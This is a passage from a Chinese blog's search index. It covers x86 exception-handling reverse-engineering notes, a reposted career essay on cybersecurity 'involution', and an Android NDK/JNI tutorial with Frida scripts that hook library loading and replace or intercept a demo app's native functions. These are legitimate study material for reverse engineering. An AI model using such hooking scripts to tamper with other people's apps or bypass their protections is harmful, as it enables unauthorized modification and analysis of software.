%d\\r\\n\", b); } catch(...) { printf(\"catch all\\r\\n\"); } system(\"pause\"); return 0; } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:17:1","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"无脑定位异常处理函数 如果我们在调试的时候,看到抛异常的函数. 我们找到SEH链第一个异常处理的地方,下断,F9运行. 按照以下定则进call. 找参数最多的call下断点. 参数一样,就同时下断,看哪个到达. 最后一层是call寄存器(eax). ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:17:2","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"异常信息关系表 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:17:3","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"还原异常处理结构(上半部分表) 函数开头进入SEH异常链. 找到异常函数信息结构体. 分析数据关系. 第一张表记录了该函数有几个try,以及对应的try块信息表指针数组. 第二张表记录了try对应的catch个数,以及Rtti描述. 第三张表记录了catch的类型以及catch的处理函数. 注意:catch的处理函数是有返回值的,返回到catch结束的位置. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:17:4","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"还原具体的异常处理代码(下半部分表) 找到函数内抛异常的函数,参数中找抛出的信息表. 找到匹配列表. 在catch信息表中找到类型信息表. 对类型信息表,做交叉引用,就可以找到对应的catch处理代码. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:17:5","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["正能量"],"content":" 注意 以下内容转载于下述公众号文章,与君共勉之! https://mp.weixin.qq.com/s/cXV1-YSqngXp332qopEZSw 不知道什么时候开始，内卷这个词突然间就火了起来，铺天盖地的讨论，大概意思是“指同行间竞相付出更多努力以争夺有限资源，从而导致个体’收益努力比’下降的现象”。进而这种“没有发展的增长”变成了全民狂欢，更有甚者，直接在任何一个管他是否良性竞争的环境也会说内卷，巴不得世界上没有任何竞争，全天下都躺平，这才叫不内卷。 内卷倒是真实存在的，我并不否认这一点，拿咱们网络安全行业举例，似乎这些方面很多现象比较明显。比如安全服务领域，人才匮乏，每次大型安全事件安保，就凭空出现一堆不知道从哪冒出来的上万人，“物美价廉”，便宜听话吃苦耐劳，大家不关注是否好用，有人头就算，生生地把这个行业拖进了泥塘。在网络安全领域，服务外包是非常成熟的市场，几个人组成一个团队，早期创世团队直接上，质量有保障，慢慢地生意越接越多，疯狂地加人，在收入面前，一切品控都变得不那么重要：相比其他厂商只要成绩不垫底就行。那批刚进来的人也很好奇和害怕，“就我这技术如此菜的人，也能为宇宙xxx服务，是不是哪里不太对”，再过一段时间学了一些工具的使用方法，反而坦然了，坦然地说“这个行业太内卷了，客户就这么几个，服务人数这么多，我们赚钱就更难了”。 如果大家把精力花在了写控标参数，写你自己都知道没人看的材料，增加一堆你知道根本没有竞争优势的技术功能点，只是为了进行拼凑堆砌，那可不就内卷了吗？因为这种做法可以预见的是，材料的字数越来越多，一个产品不应该具备的功能越来越多，商务的成本越来越高，大家的重点不在于技术和产品，而在于形式化的流程，于是大家越来越累。大家都知道这不对，但是又无法从里面挣脱出来，因为谁先撒手谁死亡。这像极了武侠小说中，两位绝世高手原本只想友善地进行切磋，轻轻一碰掌，起初势均力敌，用了二成功力，然后其中一位大侠心中暗笑，增加了一成功力，另一位大侠心中不以为然，在对方的基础上又增加了一成功力……如此往复，头上冒了青烟，血脉贲张，豆大的汗珠往下落，这时候谁也撒不了手了，撤手是死不撤手也是死，两人话都说不出来，心底暗骂“就是这老匹夫偷偷加了那一成功力，现在骑虎难下，想我一世大侠英名，今日怕是命丧于此了”。 一个想要征服大海的人，不会认为学习开船很痛苦；一个想要探索火星的人，不会认为研究物理很枯燥；一个想要登顶NBA冠军的人，不会认为每天练习体能是浪费时间。做开创性的事情怎么会无趣呢？你日复一日年复一年，做些别人已经做过了的事情，或者别人已经做得非常好的事情，你就会看到，由于没有太大的难度，于是大家都选择了这样一个看起来很容易切入的领域，因为大家都想赚“快钱”和“轻松的钱”，因此你能看到身边的竞争对手越来越多，比你努力一点点优势就出来了，于是你就又开始感叹内卷丛生。你不敢也不愿意看见别人当你睡觉的时候在图书馆看书，当你泡吧的时候别人在电脑面前编码。别人想着星辰大海，你想着酒池肉林，所以面对着同样的学习或者研究，你已经疲惫不堪，但你要是抬头看着别人那边，依然是灯火通明地在挑灯夜战。你理解不了，但是也无法形容这种情况的好坏，你感叹自己技不如人，正在准备转身离开，突然看到“内卷”这样一根救命稻草，喜极而泣，拉着身边的一群人高呼万岁。 无意义的优化和比拼叫内卷，比如我上面说的材料越写越厚，这变成了一个核心技能，写的人知道在编，看的人也知道在编，最后作为留底的纸质打印出来比人还高，还要准备一个屋子的角落把它存下来；还比如你下班比我晚，我就比你更晚，两个人在那耗着刷短视频。这些实在是一种资源的极大浪费，但是不产生任何价值。 今年我面试了一些人，感触很深。很多人会对自己的能力比较有自信，认为之前的工作挑战性不太大，自己总能够比较好的完成交代的任务。随着沟通的深入，你就会发现大家大多会对目标比较迷惑。一个人掌握数据操作，大概率就是增删改查，来来回回工作了很多年。页面一改再改，过了几年又改回了最初的设计，就这些事花不了几年，有个两三年你就是非常权威的专家。如果一如既往地等待领导交代的任务，你就会发现除了例行地经验输出，你没有了自己的成长，只是在一味消耗经验。既然这样，你如何避免在新来的人也花了两三年时间快速成长为了能够替换你的角色，但是他的成本比你低一半呢？这个现实确实非常残酷，所以跟我说35岁就不做具体研发的人比比皆是，大家很早就开始给自己规划了“养老”的生活。 什么样的场景会发生内卷？就是做了好像对社会对人类也没有太大意义的，不做也没有什么损失。最典型的场景就是为了拼凑产品体系而决定研发的一堆产品。这很大原因是因为大家都不愿意去找属于自己的细分领域，容易随大流，人云亦云。事实上，每个人都有属于自己非常独特的能力和价值，在属于你的领域你可以为所欲为，轻松干掉其他人。你不需要让自己的劣势跑到其他人的优势领域去pk，而是要找到自己的优势领域。 我也是很后来才发现我有一种能力是比别人强很多的，在此之前，我只能说我做的还不错。无论是华为的职业生涯，亦或是360的职业生涯，我都能合格地完成分配的任务，但是你说有多优秀好像也不是，关键是我做起来还感觉挺费劲的。但是在这些伟大的公司，你就能看见身边那批顶尖的人才，他们的输出就跟呼吸一样简单，他们有些人能很容易地挖掘核弹级别的漏洞，他们有些人能很轻松的完成某个重要目标的渗透，还有一些人也能在48小时内完成你这辈子都无法造成的艺术性高质量的代码。越到后来你就感觉压力很大，因为你智商拼不过别人，你学历拼不过别人，居然最后连直觉都拼不过别人，他们好像不需要努力似的，泡着妞玩着游戏喝着酒，通过肌肉记忆把球就给投进了。你还在刷各种视频和书籍，绞尽脑汁倾尽全力去尝试跟上大家的节奏。我并不怕吃苦，但是我挺害怕你做了所有的尝试，花了十倍于人家的精力，最后居然还是拼不过的时候的那种绝望。当时如果有内卷这个词，我也想要去欢呼啊。 我也去学过挖漏洞也刷了一些CVE，我也去学过渗透也进了很多目标，我也尝试去做算法开发，一系列下来我就是很累，倒也有输出，但感觉永远赶不上大家的节奏，他们笑我也笑，只是我不知道他们在笑什么，我陪着笑而已。我知道这不是属于我的节奏，但是老天啊，属于我的节奏在哪里呢？没有一个人能给我答案，我自己也不知道。我当时尝试给国内影响力最大的XCON投议题，被拒绝后感觉特别难受，总感觉自己差人一等（估计呆神flashsky等大神他们现在都不知道曾经有这么一个想要进入网络安全行业的徘徊者）。 我很感谢有那些经历，否则我后来就不会找到自己的方向。在第一次创业的时候，pangolin是我的代表作，当时只是小试牛刀，但是想不到反响有这么大。突然一下好像大家就都在用，也都认识了有一个作者叫zwell，这种感觉很神奇。我后来回想为什么会这样，因为当时做的时候感觉其实特别简单，我把所有互联网上能收集的SQL注入的文章全部下载分类，然后把它们全部实现到一个工具中去。漏洞不是我发现的，文章也不是我写的，我只是一个整理者和一个复现者和一个集成者，但是大家为什么会反馈这么强烈。大家跟我说没有人全部集成过，没有工具让流程体验这么好过，也没有界面这么酷炫过。。。。。。 我都惊呆了，就这？好像没有任何难度啊？我这不就是在作弊吗？做了一个似乎谁都能做的事情啊！你们对好工具的体验点是不是有点低？我又说，那照你们这么说，那我做一个fofa平台你们也会觉得很好用咯？我再做一个goby你们也会觉得很好用咯？后来我就上瘾了，啊，做这些破事还有钱赚？还能得到大家的尊重？还能跟这些大神坐在一起吃饭？ 突然我就有了信心，还有比这更简单的事情吗？没人在乎我挖不到漏洞了，没人在乎我不懂渗透了，也没人在乎我开发代码的丑陋以及效率低下。只是我没有想明白为什么这么容易的事情没人做，非得等到我来摘果子。后来在公司的经营过程中，我就发现了一件了不得的事情，比如打开Kali，随便找一个工具，我能在很短时间内找到一堆可以改进的点和做出彩的地方，无论是nmap还是burp还是awvs等等。如果我的目标是超越nmap，那么我就能很快列出几十项改进的具体点，而且我很有信心能够让大家更喜欢使用。但是似乎这些别人看不到，你告诉他也看不到，这就好比你在黑暗的夜里带了一个红外夜视仪，你能看到远处有一个动物跑了过来，只是身边的朋友等到这个猛兽到了眼前一米处，他也都毫无察觉。 这个感觉很奇特，我用红外夜视仪还是不恰当，因为这是一种与生俱来的直觉，这种直觉只有你有，别人完全看不见。我再回想一下就发现，以前我之所以没有这种感觉，感觉没有竞争力，实在是因为我跑进了别人的直觉范围之内，他们也看到我就如同被囚禁的野兽一样没有目标地横冲直撞，直到精疲力尽，最新放弃抵抗选择认命。 于是我开始注意去观察身边的人，有个答案还是很积极的：每个人都有自己的优势直觉范围，别人看不见你却异常清晰。当别人惊奇地问你是怎么知道一件事的，你也很好奇地说，这不是显而易见吗？有人善于做底层研究，有人善于做上层业务逻辑，有人擅长做前端展现，有人擅长做大数据的分析。有人平时沉默寡言，但是遇到技术讨论却眉飞色舞；也有人听到技术头晕脑胀，但是跟人聊起政治却是酒逢知己千杯少。正是这些不同的人的不同直觉和兴趣，才组成了这个五彩斑斓的精彩世界。有时候一些安全人员跟我开玩笑说是fofa的忠实用户，是我们的小迷弟，哪有这么多小迷弟，只是大家还在找自己的方向而已，在你们的优势领域，你们吊打我多少回都是可以的。 所以，网络安全这个领域，技术人员要脱离内卷的最好方式就是找到一个你的优势领域，在那里你的直觉会比别人好很多，你愿意长期投入时间，投入精力的那个方向。但是不要习惯了重复造","date":"2022-01-22","objectID":"/posts/%E6%AD%A3%E8%83%BD%E9%87%8F/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E4%BA%BA%E5%91%98%E5%A6%82%E4%BD%95%E9%81%BF%E5%BC%80%E5%86%85%E5%8D%B7/:0:0","tags":["正能量"],"title":"网络安全技术人员如何避开内卷","uri":"/posts/%E6%AD%A3%E8%83%BD%E9%87%8F/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E4%BA%BA%E5%91%98%E5%A6%82%E4%BD%95%E9%81%BF%E5%BC%80%E5%86%85%E5%8D%B7/"},{"categories":["Android基础"],"content":"NDK与JNI基础 什么是JNI?: JNI,全称为Java Native Interface,即Java本地接口,JNI是Java调用Native语言的一种特性.通过JNI可以使得Java与C/C++交互. JNIEnv是什么? JNIEnv是一个线程相关的结构体,该结构体代表了Java在本线程的执行环境. JNIEnv与JavaVM的区别: JNIEnv: JavaVM在线程中的代码,每个线程都有一个,JNI可能有非常多个JNIEnv. extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_myapplication_MainActivity_stringFromJNI( JNIEnv* env, jobject /* this */) { std::string hello = \"Hello from C++\"; return env-\u003eNewStringUTF(hello.c_str()); } JavaVM: 是Java虚拟机在JNI层的代表,JNI全局仅仅只有一个. JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved); JNIEXPORT void JNI_OnUnload(JavaVM* vm, void* reserved); JNIEnv的作用: 调用Java函数: JNIEnv代表了Java执行环境,能够使用JNIEnv调用Java中的代码. 操作Java函数: Java对象传入JNI层就是jobject对象,需要使用JNIEnv来操作这个Java对象. ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:1:0","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"JNI接口追踪 ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:2:0","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"jnitrace https://github.com/chame1eon/jnitrace #安装 pip install jnitrace #使用 jnitrace -l libnative-lib.so com.example.myapplication ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:2:1","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"hook_art.js https://github.com/lasting-yang/frida_hook_libart #使用 frida -U --no-pause -f package_name -l hook_art.js ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:2:2","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"Frida查看Native层调用栈 #不是很准确 console.log('CCCryptorCreate called from:\\n' + Thread.backtrace(this.context, Backtracer.ACCURATE) .map(DebugSymbol.fromAddress).join('\\n') + '\\n'); ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:2:3","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"System.load函数追踪 Java层通过以下代码进行so的加载. static { System.loadLibrary(\"luomd5\"); } public static void loadLibrary(String libname) { Runtime.getRuntime().loadLibrary0(Reflection.getCallerClass(), libname); } 接下来查看Android源码,跟踪Runtime类的loadLibrary0函数. //源码跟踪 //http://aospxref.com/android-8.1.0_r81/xref/libcore/ojluni/src/main/java/java/lang/Runtime.java loadLibrary0(String libname, ClassLoader classLoader) -\u003edoLoad -\u003enativeLoad -\u003eJVM_NativeLoad -\u003eLoadNativeLibrary -\u003eOpenNativeLibrary //http://aospxref.com/android-8.1.0_r81/xref/system/core/libnativeloader/native_loader.cpp?r=\u0026mo=19529\u0026fi=523#523 void *OpenNativeLibrary(JNIEnv *env, int32_t target_sdk_version, const char *path, jobject class_loader, jstring library_path, bool *needs_native_bridge, std::string *error_msg) if (class_loader == nullptr) { *needs_native_bridge = false; return dlopen(path, RTLD_NOW); //--- void *handle = android_dlopen_ext(path, RTLD_NOW, \u0026extinfo); if (handle == nullptr) { *error_msg = dlerror(); } } } 通过以上代码,我们可以知道Android系统有两种方式可以加载so文件. dlopen android_dlopen_ext 所以说,我们可以通过以下代码Hook上述两个函数,来查看我们想要的so是通过哪种方式加载的,进而执行下一步操作. function hook_dlopen() { Interceptor.attach(Module.findExportByName(null, \"dlopen\"), { onEnter: function(args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); console.log(\"dlopen:\", path); } }, onLeave: function(retval) { } }) Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), { onEnter: function(args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); console.log(\"android_dlopen_ext:\", path); } }, onLeave: function(retval) { } }); } setImmediate(hook_dlopen); frida -U -f com.example.luomd5 -l .\\LuoHook.js --no-pause ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:2:4","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"JNIHook ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:3:0","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"测试Apk Java层: //Java层 package com.example.luomd5; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.widget.TextView; import com.example.luomd5.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luomd5' library on application startup. static { System.loadLibrary(\"luomd5\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(mdString(\"Hello XiaLuoHun!\")); } public static native String mdString(String string); } Native层: #include \u003cjni.h\u003e #include \u003cstring\u003e #include \"md5.h\" extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luomd5_MainActivity_mdString(JNIEnv *env, jclass clazz, jstring string) { const char* szString = env-\u003eGetStringUTFChars(string, NULL); std::string strMd5 = MD5(szString).toStr(); return env-\u003eNewStringUTF(strMd5.c_str()); } ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:3:1","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"替换方式 function hook_dlopen() { Interceptor.attach(Module.findExportByName(null, \"dlopen\"), { onEnter: function (args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"dlopen:\", path); } }, onLeave: function (retval) { } }) Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), { onEnter: function (args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"android_dlopen_ext:\", path); if (path.indexOf(\"libluomd5.so\") \u003e= 0) { this.target = true; console.log(\"found [android_dlopen_ext:]\", path); } } }, onLeave: function (retval) { if (this.target) { //找到要Hook函数的地址 var mdString_addr = Module.findExportByName(\"libluomd5.so\", \"Java_com_example_luomd5_MainActivity_mdString\") console.log(\"mdString_addr: \", mdString_addr) var md5string = new NativeFunction(mdString_addr, \"pointer\", [\"pointer\", \"pointer\", \"pointer\"]); Interceptor.replace(mdString_addr, new NativeCallback((env, jclass, jstring) =\u003e { //打印原参数 console.log(Java.vm.tryGetEnv().getStringUtfChars(jstring, null).readCString()) //构造新参数 var newJSTRING = Java.vm.tryGetEnv().newStringUtf('XiaLuoHun 1234'); //调用 var retval = md5string(env, jclass, newJSTRING); //打印返回值 console.log(\"retval: \", Java.vm.tryGetEnv().getStringUtfChars(retval, null).readCString()); return retval }, \"pointer\", [\"pointer\", \"pointer\", \"pointer\"])) } } }); } setImmediate(hook_dlopen); ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:3:2","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"Hook方式 也可以通过下述代码进行Hook,查看Native层函数的参数和返回值. function hook_dlopen() { Interceptor.attach(Module.findExportByName(null, \"dlopen\"), { onEnter: function (args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"dlopen:\", path); } }, onLeave: function (retval) { } }) Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), { onEnter: function (args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"android_dlopen_ext:\", path); if (path.indexOf(\"libluomd5.so\") \u003e= 0) { this.target = true; console.log(\"found [android_dlopen_ext:]\", path); } } }, onLeave: function (retval) { if (this.target) { var mdString_addr = Module.findExportByName(\"libluomd5.so\", \"Java_com_example_luomd5_MainActivity_mdString\") console.log(\"mdString_addr: \", mdString_addr) Interceptor.attach(mdString_addr, { onEnter: function (args) { var env = Java.vm.getEnv(); console.log(\"arg2 jstring: \", env.getStringUtfChars(args[2], NULL).readCString()) }, onLeave: function (retval) { var env = Java.vm.getEnv(); console.log(\"retval jstring: \", env.getStringUtfChars(retval, NULL).readCString()) } }) } } }); } setImmediate(hook_dlopen); ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:3:3","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"动态注册 动态注册的JNI函数在native层实现的函数名称不定,并且不一定要求相应函数是导出类型,比静态注册更安全. 通过以下函数即可完成动态注册. //第一个参数clazz, native函数所在的类,可通过FindClass这个JNI函数获取(将类名的\".\"符号换成\"/\") //第二个参数methods, 是一个数组,其中包含函数的一些签名信息以及对应在native层的函数指针 //第三个参数nMethods, 是methods数组的数量 jint RegisterNatives(jclass clazz, const JNINativeMethod* methods,jint nMethods) ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:4:0","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"示例代码 Java层: package com.example.luomd5; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.widget.TextView; import com.example.luomd5.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luomd5' library on application startup. static { System.loadLibrary(\"luomd5\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(mdString(\"Hello XiaLuoHun!\")); } public static native String mdString(String string); } Native层: #include \u003cjni.h\u003e #include \u003cstring\u003e #include \"md5.h\" #define NELEM(x) ((int) (sizeof(x) / sizeof((x)[0]))) jstring LuoNativeFunc(JNIEnv *env, jclass clazz, jstring string) { const char *szString = env-\u003eGetStringUTFChars(string, NULL); std::string strMd5 = MD5(szString).toStr(); return env-\u003eNewStringUTF(strMd5.c_str()); } static JNINativeMethod method_table[] = { {\"mdString\", \"(Ljava/lang/String;)Ljava/lang/String;\", (void *) LuoNativeFunc}, }; static int registerMethods(JNIEnv *env, const char *className, JNINativeMethod *gMethods, int numMethods) { jclass clazz = env-\u003eFindClass(className); if (clazz == nullptr) { return JNI_FALSE; } if (env-\u003eRegisterNatives(clazz, gMethods, numMethods) \u003c 0) { return JNI_FALSE; } return JNI_TRUE; } JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) { JNIEnv *env = nullptr; if (vm-\u003eGetEnv((void **) \u0026env, JNI_VERSION_1_6) != JNI_OK) { return JNI_ERR; } // 注册native方法 if (!registerMethods(env, \"com/example/luomd5/MainActivity\", method_table, NELEM(method_table))) { return JNI_ERR; } return JNI_VERSION_1_6; } ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:4:1","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"源码分析 动态注册的主要函数是RegisterNatives,下面从Android源码中分析该函数流程. //http://aospxref.com/android-8.1.0_r81/xref/art/runtime/jni_internal.cc#2241 RegisterNatives(JNIEnv* env,jclass java_class,const JNINativeMethod* methods,jint method_count){ //--- for (jint i = 0; i \u003c method_count; ++i) { const char* name = methods[i].name; const char* sig = methods[i].signature; const void* fnPtr = methods[i].fnPtr; if (UNLIKELY(name == nullptr)) { ReportInvalidJNINativeMethod(soa, c.Get(), \"method name\", i); return JNI_ERR; } else if (UNLIKELY(sig == nullptr)) { ReportInvalidJNINativeMethod(soa, c.Get(), \"method signature\", i); return JNI_ERR; } else if (UNLIKELY(fnPtr == nullptr)) { ReportInvalidJNINativeMethod(soa, c.Get(), \"native function\", i); return JNI_ERR; } //--- ArtMethod* m = nullptr; m = FindMethod\u003c...\u003e(current_class.Ptr(), name, sig); //--- const void* final_function_ptr = m-\u003eRegisterNative(fnPtr, is_fast); } -\u003e RegisterNative(fnPtr, is_fast); -\u003e SetEntryPointFromJni(new_native_method); -\u003e SetEntryPointFromJniPtrSize(entrypoint, kRuntimePointerSize); -\u003e SetDataPtrSize(entrypoint, pointer_size); -\u003e SetNativePointer(DataOffset(pointer_size), data, pointer_size); SetNativePointer里面的代码,意思就是将上述找到的Native函数指针fnPtr赋值给下方ArtMethod类中的ptr_sized_fields结构体中的data字段. ArtMethod结构体: //http://aospxref.com/android-8.1.0_r81/xref/art/runtime/art_method.h class ArtMethod{ protected: // Field order required by test \"ValidateFieldOrderOfJavaCppUnionClasses\". // The class we are a part of. GcRoot\u003cmirror::Class\u003e declaring_class_; // Access flags; low 16 bits are defined by spec. // Getting and setting this flag needs to be atomic when concurrency is // possible, e.g. after this method's class is linked. Such as when setting // verifier flags and single-implementation flag. std::atomic\u003cstd::uint32_t\u003e access_flags_; /* Dex file fields. The defining dex file is available via declaring_class_-\u003edex_cache_ */ // Offset to the CodeItem. uint32_t dex_code_item_offset_; // Index into method_ids of the dex file associated with this method. uint32_t dex_method_index_; /* End of dex file fields. */ // Entry within a dispatch table for this method. For static/direct methods the index is into // the declaringClass.directMethods, for virtual methods the vtable and for interface methods the // ifTable. uint16_t method_index_; // The hotness we measure for this method. Managed by the interpreter. Not atomic, as we allow // missing increments: if the method is hot, we will see it eventually. uint16_t hotness_count_; // Fake padding field gets inserted here. // Must be the last fields in the method. struct PtrSizedFields { // Short cuts to declaring_class_-\u003edex_cache_ member for fast compiled code access. mirror::MethodDexCacheType* dex_cache_resolved_methods_; // Pointer to JNI function registered to this method, or a function to resolve the JNI function, // or the profiling data for non-native methods, or an ImtConflictTable, or the // single-implementation of an abstract/interface method. void* data_; // Method dispatch from quick compiled code invokes this pointer which may cause bridging into // the interpreter. void* entry_point_from_quick_compiled_code_; } ptr_sized_fields_; }; ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:4:2","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"二次注册 Native层Hook思路:通过调用RegisterNatives方法注册函数,那我们可以再次调用RegisterNatives方法进行注册,覆盖掉先前注册的函数,从而实现Hook. 一种通用超简单的Android Java Native方法Hook fake-linker-main ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:4:3","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"调用JNI中的方法 ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:5:0","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"Frida 准备一个so文件: Java层: package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.widget.TextView; import com.example.luodst.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luodst' library on application startup. static { System.loadLibrary(\"luodst\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); } public native String stringFromJNI(); public native int LuoAdd(int n1, int n2); public static native String mdString(String string); } Native层: #include \u003cjni.h\u003e #include \u003cstring\u003e #include \"md5.h\" extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luodst_MainActivity_stringFromJNI( JNIEnv *env, jobject /* this */) { std::string hello = \"Hello from C++\"; return env-\u003eNewStringUTF(hello.c_str()); } extern \"C\" JNIEXPORT jint JNICALL Java_com_example_luodst_MainActivity_LuoAdd(JNIEnv *env, jobject thiz, jint n1, jint n2) { return n1 + n2; } extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luodst_MainActivity_mdString(JNIEnv *env, jclass clazz, jstring string) { const char *szString = 